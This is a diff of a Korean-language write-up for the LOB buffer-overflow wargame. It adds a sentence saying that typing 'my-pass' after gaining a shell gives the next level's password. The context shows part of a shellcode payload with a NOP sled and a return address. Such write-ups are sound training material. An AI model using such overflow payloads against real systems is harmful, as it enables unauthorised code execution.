@@ -81,7 +81,7 @@ bash$ whoami
 gate
 ```
 
-이제 이 익스플로잇을 그대로 `home`디렉토리에서 진행하면 다음 레벨로 가는 password를 얻을 수 있다.
+이제 이 익스플로잇을 그대로 `home`디렉토리에서 진행하면 다음 레벨로 가는 password를 얻을 수 있다. LOB에서 쉘을 획득했을 때는 `my-pass`라는 특수한 명령어를 입력하면 password를 준다.
 
 ```bash
 <99\xb0\x0b\xcd\x80"+"\x90"*136+"\x10\xfd\xff\xbf"'`
